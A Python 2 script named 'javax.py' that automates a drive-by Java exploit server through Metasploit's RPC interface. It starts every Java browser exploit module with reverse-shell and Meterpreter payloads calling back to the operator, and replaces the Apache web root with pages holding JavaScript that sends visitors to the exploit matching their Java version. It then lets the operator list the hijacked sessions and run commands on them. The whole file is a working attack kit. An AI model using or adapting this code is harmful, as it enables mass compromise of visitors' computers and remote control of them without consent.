#!/usr/bin/python
import re, os, sys, time, socket, random
from subprocess import Popen, PIPE
from conf import settings as set_data
class bcolors:
    LIGHT_GREEN = '\033[36m'
    OKBLUE = '\033[94m'
    BLUE = '\033[34m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    LIGHT_RED = '\033[31m'
    GREEN='\033[32m'
    BROWN='\033[33m'
    GRAY='\033[37m'
    def disable(self):
        self.LIGHT_GREEN = ''
        self.OKBLUE = ''
        self.BLUE = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''
        self.LIGHT_RED = ''
        self.GREEN=''
        self.BROWN=''
        self.GRAY=''
my_selection=int(0)
user_id=Popen(['id -u'], shell=True, stdout=PIPE).stdout.readlines()
if user_id[0][0] == '0':
    pass
else:
    print "Not root, Try 'sudo python javax.py' first."
    sys.exit()
def python_check():
    try:
        import msfrpc
        pass
    except:
        print bcolors.LIGHT_RED+"MSFRPC NOT INSTALLED, INSTALLING IT NOW!"+bcolors.ENDC
        os.system('git clone https://github.com/SpiderLabs/msfrpc.git /tmp/msfrpc')
        os.chdir('/tmp/msfrpc/python-msfrpc/')
        os.system('python setup.py install')
        os.system('apt-get install msgpack-python')
        os.system('rm -rf /tmp/msfrpc')
        print "Try running python javax.py Again! Good Luck!"
        sys.exit()
def check_files():
    iface=set_data.interface
    ip=Popen(['ifconfig '+iface], shell=True, stdout=PIPE).stdout.readlines()
    find_ip=re.compile(r'\d+.\d+.\d+.\d+')
    xxx=find_ip.findall(str(ip))
    current=os.getcwd()
    opx=os.listdir(current)
    if 'tmpdir' in opx:
        pass
    else:
        try:
            os.mkdir('tmpdir')
        except OSError:
            print "TMP DIR ISSUES!"
            sys.exit()
    www_files=os.listdir('/var/www')
    if 'old_www' in www_files:
        old_files=os.listdir('/var/www/old_www')
        if 'index.html' in old_files:
            pass
    if 'index.html' in www_files:
        try:
            os.mkdir('/var/www/old_www')
            os.system('mv /var/www/index.html /var/www/old_www')
        except OSError:
            index=os.listdir('/var/www/old_www')
            if 'index.html' in index:
                pass
    else:
        pass
    if 'PluginDetect.js' in www_files:
        pass
    else:
        if "PluginDetect.js" in opx:
            os.system('cp PluginDetect.js /var/www')
        else:
            print "Error Exiting!"
            sys.exit()
    if "post.php" in opx:
        with open("/var/www/post.php", "wt") as out:
            for line in open("post.php", 'r'):        
                if 'http' in line:
                    data=re.compile(r'http\://\d+.\d+.\d+.\d+')
                    x=data.findall(line)
                    try:
                        if x[0]:
                            out.write(line.replace(str(x[0]), 'http://'+xxx[0]))
                        else: pass
                    except IndexError:
                        pass
                else:
                    out.write(line)
            for line in open('tmpdir/exploit_file', 'r'):
                out.write(line)
    else:
        print "Error Exiting!"
        pass
    if  'index.php' in www_files:
        pass
    else:
        if "index.php" in opx:
            os.system('cp index.php /var/www')
        else:
            print "Error Esssxiting!"
def checks(username_ck, passwd_ck):
    import msfrpc
    bcur=os.getcwd()
    dcx=os.listdir(bcur)
    if 'tmpdir' in dcx:
        pass
    else:
        try:
            os.mkdir('tmpdir')
        except OSError:
            print "TMP DIR ISSUES!"
            sys.exit()
    username_ck=username_ck
    passwd_ck=passwd_ck
    client=msfrpc.Msfrpc({'port':55552})
    apache_pid=""
    apache_status=""
    try:
        apache_status=Popen(['netstat -anop|grep apache|awk -F\' \' \'{print $7}\'|awk -F\'/\' \'{print $2}\''], shell=True, stdout=PIPE).stdout.readlines()
        apache_pid=Popen(['netstat -anop|grep apache|awk -F\' \' \'{print $7}\'|awk -F\'/\' \'{print $1}\''], shell=True, stdout=PIPE).stdout.readlines()
        if apache_status:
            pass
        else:
            os.system('/etc/init.d/apache2 start')
    except:
        print 'Error Exiting.'
        sys.exit()
    try:
        client.login(username_ck, passwd_ck)
        pass
    except Exception:
        Popen(['msfrpcd -U '+ set_data.username + ' -P ' + set_data.passwd + ' -p 55552 -S'], shell=True, stdout=PIPE)
        time.sleep(90)            
        pass      
def banners():
	bann=bcolors.BLUE+'''
  _  _     _    
   //_/| |/_/\ /
(_// / |// / /'\ JAVAX 

    '''+bcolors.ENDC
        print bann
        pass
def menu():
    print "Javax"
    print "1. Sessions"
    print "2. Start Java Exploits"
    print "3. Kill all Jobs"
    print "4. Shutdown"
class Srvstart(object):
    """docstring for Srvstart"""
    def __init__(self, arg, kwargs):
        super(Srvstart, self).__init__()
        import msfrpc
        self.arg=arg
        iface=set_data.interface
        ip=Popen(['ifconfig '+iface], shell=True, stdout=PIPE).stdout.readlines()
        find_ip=re.compile(r'\d+\.\d+\.\d+\.\d+')
        xxx=find_ip.findall(str(ip))
        try:
            self.ip_check = str(xxx[0])
        except IndexError:
            print bcolors.LIGHT_RED+"Make Sure Interface in conf/settings.py is set to the correct NIC"+bcolors.ENDC
            sys.exit()
        self.kwargs=kwargs
        self.client=msfrpc.Msfrpc({'port':55552})
        self.client.login(arg, kwargs)
    def load_exploit(self):
        load_count=0
        self.browser_exploits=[]
        self.exploit_module = self.client.call('module.exploits', [])
        for exploits in self.exploit_module['modules']:
            if 'java' in exploits:
                load_count=load_count+1
                exploits=exploits
                self.browser_exploits+=[exploits]
    def exploit_run(self):
        exploit_count=0
        self.SRVHOST=self.ip_check
        self.SRVPORT=0
        print "Loading Exploits"
        for f in self.browser_exploits:
            self.SRVPORT=self.SRVPORT+1
            exploit_count=exploit_count+1
            if 'java' in f.lower():
                try:
                    if 'windows/browser/java_cmm':
                        calls=client.call('module.execute', 
                                    ['exploit', 'windows/browser/java_cmm', 
                                    {'PAYLOAD' : 'generic/shell_reverse_tcp', 
                                    'SRVPORT'  : self.SRVPORT+8080, 
                                    'SRVHOST'  : self.SRVHOST, 
                                    'LPORT'    : exploit_count+4040, 
                                    'LHOST'    : self.SRVHOST
                                    }])
                    else:
                        calls=self.client.call('module.execute', 
                                    ['exploit', f, 
                                    {'PAYLOAD' : 'java/meterpreter/reverse_tcp', 
                                    'SRVPORT'  : self.SRVPORT+8080, 
                                    'SRVHOST'  : self.SRVHOST, 
                                    'LPORT'    : exploit_count+4040 , 
                                    'LHOST'    : self.SRVHOST
                                    }])
                except:
                    calls=self.client.call('module.execute', 
                                    ['exploit', f, 
                                    {'PAYLOAD' : 'java/meterpreter/reverse_https', 
                                    'SRVPORT'  : self.SRVPORT+8080, 
                                    'SRVHOST'  : self.SRVHOST, 
                                    'LPORT'    : exploit_count+4040 , 
                                    'LHOST'    : self.SRVHOST
                                    }])
            elif 'windows' in f.lower():
                calls=self.client.call('module.execute', 
                                    ['exploit', f, 
                                    {'PAYLOAD' : 'payload/java/meterpreter/reverse_https', 
                                    'SRVPORT'  : self.SRVPORT+8080, 
                                    'SRVHOST'  : self.SRVHOST, 
                                    'LPORT'    : exploit_count+4040 , 
                                    'LHOST'    : self.SRVHOST
                                    }])
            elif 'osx' in f.lower():
                calls=self.client.call('module.execute', 
                                    ['exploit', f, 
                                    {'PAYLOAD' : 'java/shell/reverse_tcp', 
                                    'SRVPORT'  : self.SRVPORT+8080, 
                                    'SRVHOST'  : self.SRVHOST, 
                                    'LPORT'    : exploit_count+4040 , 
                                    'LHOST'    : self.SRVHOST
                                    }])
            else:
                calls=self.client.call('module.execute', 
                                    ['exploit', f, 
                                    {'PAYLOAD' : 'payload/java/meterpreter/reverse_https', 
                                    'SRVPORT'  : self.SRVPORT+8080, 
                                    'SRVHOST'  : self.SRVHOST, 
                                    'LPORT'    : exploit_count+4040 , 
                                    'LHOST'    : self.SRVHOST
                                    }])
        pass
    def sessions(self):
        session_count=0
        rep_shel=self.client.call('session.list', [])
        for line in rep_shel:
            session_count+=session_count+1
        os.system('clear')
        print "Session Count:", session_count
        if session_count == 0 :
            pass
        else:
            sesans=raw_input("Would You Like to interact with a session? Y or N: ")
            if sesans.lower() == "y":
                print "Select Session:"
                for line in rep_shel:
                    print bcolors.BLUE+"session ID:" + bcolors.ENDC + bcolors.FAIL+str(line)+bcolors.ENDC, rep_shel[line]['info']
                    print bcolors.BLUE+"     via_exploit:"+bcolors.ENDC+rep_shel[line]['via_exploit']
                    print bcolors.BLUE+"     session_host:"+bcolors.ENDC+rep_shel[line]['session_host']
                    print bcolors.BLUE+"     type:"+bcolors.ENDC+bcolors.GREEN+ rep_shel[line]['type'] + bcolors.ENDC
                    print bcolors.BLUE+"     Payload:"+bcolors.ENDC+bcolors.GREEN+ rep_shel[line]['via_payload'] + bcolors.ENDC
                shell_ans=raw_input("Number: ")
                raw_cmd=raw_input("CMD: ")
                rep_ses=self.client.call('session.meterpreter_write', [int(shell_ans), str(raw_cmd)])
                time.sleep(1.4)
                rep_spon=self.client.call('session.meterpreter_read', [int(shell_ans)])
                time.sleep(1.4)
                print rep_spon['data']
            else:
                print "Exiting"
    def postphp(self):
        f=self.client.call('job.list', [])
        exfile=open('tmpdir/exploit_file', 'w+')
        for line in f.keys():
            jobd=self.client.call('job.info', [str(line)])
            try:
                sploit=str(jobd['name']).split(" ")
                if sploit[1] == 'multi/browser/java_storeimagearray':
                    exfile.write("if ( jver == '1,7,0,21' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,20' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,19' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,18' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                if sploit[1] == 'multi/browser/java_jre17_driver_manager':
                    exfile.write("if ( jver == '1,7,0,17' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,16' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,15' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,14' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,13' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,12' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,11' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                if sploit[1] =='multi/browser/java_jre17_jmxbean_2':
                    exfile.write("if ( jver == '1,7,0,10' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,9' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,8' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                if sploit[1] == 'multi/browser/java_jre17_jaxws':
                    exfile.write("if ( jver == '1,7,0,7' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,6' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,5' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,4' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,3' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                if sploit[1] == 'multi/browser/java_atomicreferencearray':
                    exfile.write("if ( jver == '1,7,0,2' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,1' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                if sploit[1] == 'multi/browser/java_rhino':
                    exfile.write("if ( jver == '1,7,0,0' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,27' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,26' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,25' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,24' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,7,0,23' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                if sploit[1] == 'multi/browser/java_rmi_connection_impl':
                    exfile.write("if ( jver == '1,6,0,18' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,17' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,22' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,21' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,20' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,19' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,18' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                if sploit[1] == 'multi/browser/java_setdifficm_bof':
                    exfile.write("if ( jver == '1,6,0,16' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,15' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,14' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,13' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,12' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,11' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,6,0,10' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,21' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,20' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,19' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,18' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,17' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,16' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,15' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,14' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                    exfile.write("if ( jver == '1,5,0,13' ) { document.location=\"http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath'])+"\";}\n")
                else:
                    pass
            except:
                pass
        exfile.write('</script></body></html>\n')
        exfile.close()
        Popen(['chmod 755 -R /var/www/'], shell=True, stdout=PIPE)
        pass
    def pathTOvuln(self):
        f=self.client.call('job.list', [])
        for line in f.keys():
            jobd=self.client.call('job.info', [str(line)])
            try:    
                print "EXPLOIT", jobd['name']

                print "Need to write http://"+str(self.ip_check)+":"+str(jobd['datastore']['SRVPORT'])+str(jobd['uripath']) 
            except:
                pass
        pass
    def job_info(self, job_number):
        self.job_number=job_number
        print job_number
        f=self.client.call('job.list', [])
        for line in f.keys():
            if job_number == line:
                jobd=self.client.call('job.info', [job_number])
                try:
                    print "URIPATH", jobd['uripath']
                except:
                    pass
                print "LPORT", jobd['datastore']['LPORT']
                print jobd
            else:
                pass
        pass
    def job_control(self):
        f=self.client.call('job.list', [])
        killed_jobs = 0
        for line in f.keys():
            killed_jobs = killed_jobs + 1
            xx=self.client.call('job.stop', [int(line)])
        print "Killed " + str(killed_jobs) + " jobs."
        pass
    def job_listf(self):
        jc=0
        jobs=self.client.call('job.list', [])
        for line in jobs.keys():
            jc=jc+1
        if jc > 1:
            return True
        else:
            return False

def main():
    banners()
    python_check()
    checks(set_data.username, set_data.passwd)
    x=Srvstart(set_data.username, set_data.passwd)
    x.load_exploit()
    job_bool=x.job_listf()
    if job_bool == True:
        pass
    else:
        pass
    x.postphp()
    check_files()
    os.system('clear')
    def selection(select):
        banners()
        menu()
        my_selection=int(raw_input(bcolors.BLUE+'Select Option:'+bcolors.ENDC))
        if my_selection== 1 :
            os.system('clear')
            x.sessions()
            pass
        elif my_selection== 2 :
            os.system('clear')
            x.exploit_run()
            x.postphp()
            check_files()
            pass
        elif my_selection== 3 :
            os.system('clear')
            x.job_control()
            pass
        else: 
            if my_selection== 4 :
                print "Apache not shutdown. Derp!"
                sys.exit()
    while True:
        try:
            selection(my_selection)
        except ValueError:
            print "Wrong Selection"
if __name__ == '__main__':
    try:
        main()
    except:
        sys.exit()